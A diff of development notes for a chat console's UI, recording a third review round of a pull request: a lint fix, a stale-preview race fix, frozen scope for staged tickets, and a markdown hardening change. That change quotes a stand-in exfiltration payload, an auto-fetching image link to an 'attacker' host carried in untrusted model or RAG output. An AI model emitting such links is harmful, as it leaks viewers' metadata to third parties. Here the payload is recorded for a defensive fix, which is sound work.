@@ -169,6 +169,42 @@ effect deps; `runPreview` now clears the old verdict up front so the card shows
 Once staged/discarded (or mid-commit), a scope flip deliberately does NOT
 restart the preview — the created proposal is a fact about the old scope.
 
+## Review round 3 (PR #325, same day)
+
+Four more findings, each verified and fixed:
+
+1. **CI lint error `draft-card.tsx` "Cannot access refs during render"** — the
+   phase-mirror ref was written in the render body. Reworked: `scopeKey` is now
+   a `useMemo` over stable ids, and the preview effect compares the last
+   previewed scope INSIDE the effect (`lastPreviewScopeRef`) with `phase` in
+   the deps — no render-time ref access at all.
+2. **Image auto-fetch in assistant markdown** — untrusted model/RAG text could
+   exfiltrate viewer metadata via `![x](https://attacker/...)` because
+   react-markdown emits a real `<img>` the browser fetches on render.
+   `markdown.tsx` now renders images as visible non-fetching links
+   (`[image: alt]`, opens in a new tab only on click). Audited the remaining
+   defaults: no rehype-raw (HTML stays escaped), links/autolinks require a
+   click, GFM adds only tables/strikethrough/task-list checkboxes — `img` was
+   the only auto-fetching element.
+3. **Stale preview response race** — overlapping dry-runs (rapid scope flips,
+   manual Re-check during an auto run) could resolve out of order, letting an
+   older response overwrite the newer verdict; a late preview could also flip
+   phase after stage()/discard. Added a monotonic `previewGenRef`: each run
+   captures its generation and only the latest may write
+   decision/estimate/phase; stage() and discard() bump the generation to
+   invalidate anything still in flight.
+4. **Staged tickets freeze their scope** — at stage() time the reality
+   word/phrase/tone/clarification + account label are frozen into `stagedScope`
+   and the staged ticket renders from those frozen values (chip + LIVE approval
+   copy). When the console has since switched accounts, the ticket says so
+   plainly: "Staged on X (WORD · phrase) — the console has since switched
+   accounts. Switch back to that account to review it in Approvals" (Approvals
+   lists only the ACTIVE account's proposals).
+
+Also merged `origin/main` through #323/#324/#329/#330 during this round
+(clean merges; STATUS/PLAN kept every lane's entries). Full verify gate re-run
+on the final merged tree.
+
 ## Follow-ups
 
 - **Chat idempotency (server-side, separate PR)**: accept an optional
